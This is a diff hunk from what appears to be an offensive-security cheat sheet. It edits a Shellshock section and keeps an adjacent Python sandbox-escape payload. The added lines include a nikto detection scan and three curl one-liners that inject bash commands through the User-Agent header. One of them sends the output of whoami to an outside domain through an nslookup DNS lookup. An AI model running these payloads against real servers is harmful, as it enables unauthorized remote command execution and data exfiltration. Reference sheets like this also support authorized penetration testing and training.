@@ -1772,10 +1772,20 @@ https://github.com/rodolfomarianocy/hackshell
 ```
 "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
 ```
+	
 ### Shellshock
+-> Detection
 ```
-User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com
+nikto -h <IP> -C all
 ```
+	
+-> Exploit
+```
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
+curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
+curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
+```
+	
 ## Third-party Software, ITSM, ITSO, ITBM
 ### Jira
 -> Check privileges in:  
